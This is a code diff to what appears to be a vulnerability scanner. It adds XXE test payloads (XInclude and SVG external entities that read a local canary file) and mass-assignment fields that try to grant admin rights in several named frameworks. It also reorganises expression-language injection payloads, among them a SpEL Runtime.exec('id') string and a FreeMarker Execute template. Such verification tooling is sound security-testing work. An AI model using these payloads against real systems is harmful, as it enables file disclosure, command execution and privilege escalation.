@@ -5409,8 +5409,15 @@ def verify_generic_xxe(
                    f'"file://{canary_path}">]><soap:Envelope '
                    f'xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/"><soap:Body>'
                    f'<foo>&xxe;</foo></soap:Body></soap:Envelope>')
+        xxe_xinclude = (f'<foo xmlns:xi="http://www.w3.org/2001/XInclude">'
+                        f'<xi:include parse="text" href="file://{canary_path}"/></foo>')
+        xxe_svg = (f'<svg xmlns="http://www.w3.org/2000/svg"><!DOCTYPE svg ['
+                   f'<!ENTITY xxe SYSTEM "file://{canary_path}">]>'
+                   f'<text>&xxe;</text></svg>')
         xml_variants = [("entidad general (DOCTYPE normal)", xxe_general),
                         ("parametro-entidad", xxe_param_entity),
+                        ("XInclude", xxe_xinclude),
+                        ("SVG embed", xxe_svg),
                         ("envuelta en SOAP", xxe_soap)]
 
         m = (http_method or "GET").upper().split("/")[0].split("|")[0].strip() or "GET"
@@ -9878,6 +9885,14 @@ _MASS_ASSIGN_FIELD_SETS = [
     {"admin": True, "superAdmin": True, "type": "admin"},
     # Ruby on Rails Pundit/CanCan
     {"role": "admin", "admin": True},
+    # Directus: roles are UUIDs; probe admin role UUID placeholder
+    {"role": "00000000-0000-0000-0000-000000000000"},
+    # Audiobookshelf: type field
+    {"type": "admin", "isAdmin": True},
+    # h3 / Nuxt / generic JS: scope field
+    {"scope": "admin", "access_level": 99, "privilege": "admin"},
+    # Django REST Framework: user_type or account_type
+    {"user_type": "admin", "account_type": "admin"},
 ]
 
 #: Signals in a successful registration/update response that suggest admin was set
@@ -11444,27 +11459,26 @@ def verify_generic_expression_language_injection(
     _expected = _a + _b
 
     # EL payload variants across different frameworks
-    _EL_VARIANTS = [
-        # Spring SpEL
+    # Base variants from inline payloads
+    _EL_BASE = [
         "${T(java.lang.Runtime).getRuntime().exec('id')}",
         "#{T(java.lang.Math).sqrt(1234)}",
         f"${{1 * {_a} + {_b}}}",
         f"#{{{_a} + {_b}}}",
-        # Thymeleaf (CVE-2023-38286 style)
         f"__${{{_a} + {_b}}}__::~{{}}/",
-        f"${{_{{''.class.forName('java.lang.Runtime').getMethod('exec',''.class).invoke(_{{''.class.forName('java.lang.Runtime').getDeclaredMethod('getRuntime').invoke(null)}},'{_a}+{_b}')}}}}",
-        # JSP EL
-        f"${{{_a} + {_b}}}",
-        # FreeMarker
         f"${{{_a} + {_b}}}",
         f"<#assign ex='freemarker.template.utility.Execute'?new()>${{ex('{_a}+{_b}')}}",
-        # Velocity
         f"#set($x = {_a} + {_b})${{x}}",
         f"#set($y = {_a})#set($z = {_b})#set($r = $y + $z)${{r}}",
-        # Simple math
         f"{_a}+{_b}",
-        f"${{{_a}+{_b}}}",
     ]
+    # Extended variants from payload_kb
+    try:
+        from .payload_kb import load_el_injection_payloads as _lel
+        _EL_KB = _lel(_a, _b)
+    except Exception:
+        _EL_KB = []
+    _EL_VARIANTS = list(dict.fromkeys(_EL_BASE + _EL_KB))
     _pat = re.compile(rf"(?<!\d){_expected}(?!\d)")
 
     lab = None
